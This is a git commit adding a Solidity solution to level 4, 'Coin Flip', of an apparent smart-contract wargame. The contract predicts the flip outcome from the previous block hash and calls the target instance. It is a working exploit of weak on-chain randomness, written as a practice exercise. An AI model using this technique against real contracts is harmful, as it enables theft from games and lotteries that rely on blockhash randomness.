4a724f1d940d5e8c0bc70699d486a3b4fad0446c
Tudor Anastasiu <tg.anastasiu@gmail.com>
2024-01-11 14:27:22 +0200

    feat: add level 4 - Coin Flip

---
+++ src/4_CoinFlipSolution.sol
@@ -0,0 +1,27 @@
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.23;
+import "@openzeppelin/contracts/utils/math/Math.sol";
+
+interface ICoinFlip {
+    function flip(bool _guess) external returns(bool);
+    function consecutiveWins() external returns(uint256);
+}
+
+address constant INSTANCE = 0xA09efEbeA5Db5e0277DDc10c610b71183d3Ee939;
+uint256 constant FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
+
+contract CoinFlipSolution {
+    using Math for uint256;
+
+    ICoinFlip instance = ICoinFlip(INSTANCE);
+
+    function solve() external {
+        (, uint256 prevBlockNumber) = (block.number).trySub(1);
+        uint256 blockValue = uint256(blockhash(prevBlockNumber));
+        (, uint256 coinFlip) = (blockValue).tryDiv(FACTOR);
+        bool side = coinFlip == 1 ? true : false;
+
+        bool success = instance.flip(side);
+        require(success, "Bad guess");    
+    }
+}
